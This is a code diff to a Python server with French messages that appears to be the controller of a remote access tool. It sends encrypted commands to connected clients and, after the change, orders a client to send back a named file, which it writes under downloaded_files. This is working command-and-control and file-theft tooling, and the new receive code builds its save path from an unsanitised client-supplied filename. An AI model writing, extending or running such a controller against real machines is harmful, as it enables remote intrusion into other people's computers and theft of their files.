@@ -129,18 +129,36 @@ def handle_client(client_socket, address):
 
                 decrypted_response = decrypt_data(data).decode('utf-8', errors='replace')
 
-                if decrypted_response.startswith("download_result "):
+                if decrypted_response.startswith("download_result"):
+                    parts = decrypted_response.split(" ", 2)
+                    if len(parts) < 3:
+                        print("[!] Mauvais format de commande download_result")
+                        continue
+
+                    filename = parts[1]
                     try:
-                        _, filename, size_str = decrypted_response.strip().split(" ", 2)
-                        filesize = int(size_str)
-                        print(f"[+] Téléchargement du fichier {filename} ({filesize} octets)...")
-                        expecting_file = True
-                        handle_file_transfer(client_socket, filename, filesize)
-                        expecting_file = False
-                    except Exception as e:
-                        print(f"[-] Erreur pendant la réception de fichier : {e}")
-                else:
-                    print(f"\n[RECV from {client_name} ({address})]:\n{decrypted_response}\n---END OF RESPONSE---")
+                            filesize = int(parts[2])
+                    except ValueError:
+                            print("[!] Taille invalide pour le fichier")
+                            continue
+
+                    save_path = os.path.join("downloaded_files", filename)
+                    os.makedirs("downloaded_files", exist_ok=True)
+
+                    print(f"[+] Réception de '{filename}' ({filesize} octets)...")
+
+                    received_bytes = 0
+                    with open(save_path, "wb") as f:
+                            while received_bytes < filesize:
+                                chunk = client_socket.recv(min(1024, filesize - received_bytes))
+                                if not chunk:
+                                    break
+                                f.write(chunk)
+                                received_bytes += len(chunk)
+
+                    print(f"[✓] Fichier sauvegardé dans : {save_path}")
+                    continue
+                print(f"\n[RECV from {client_name} ({address})]:\n{decrypted_response}\n---END OF RESPONSE---")
             else:
                 # On ne devrait jamais arriver ici car handle_file_transfer bloque la réception complète
                 pass
@@ -222,23 +240,19 @@ def interact_with_client(client_socket, client_name, address):
             if cmd.lower() == 'back':
                 break
 
-            # Commande spéciale pour envoyer un fichier local au client
-            if cmd.lower().startswith("upload "):
-                filepath = cmd[7:].strip()
-                if not os.path.isfile(filepath):
-                    print("[!] File does not exist.")
+            if cmd.lower().startswith("download "):
+                filename = cmd[9:].strip()
+                if not filename:
+                    print("[!] Nom de fichier invalide.")
                     continue
 
-                filesize = os.path.getsize(filepath)
-                filename = os.path.basename(filepath)
-                # Envoie commande upload au client (à implémenter côté client)
-                cmd_msg = f"upload {filename} {filesize}"
+                # Envoie une commande au client pour qu’il envoie ce fichier
+                cmd_msg = f"download {filename}"
                 client_socket.sendall(encrypt_data(cmd_msg.encode('utf-8')))
-                # TODO: gérer l'envoi du fichier côté client ici (pas dans ce code)
 
-                print(f"[!] Upload command sent for file '{filename}' ({filesize} bytes).")
-
+                print(f"[+] Commande de téléchargement envoyée pour : {filename}")
                 continue
+
 
             encrypted_cmd = encrypt_data(cmd.encode('utf-8'))
             if encrypted_cmd:
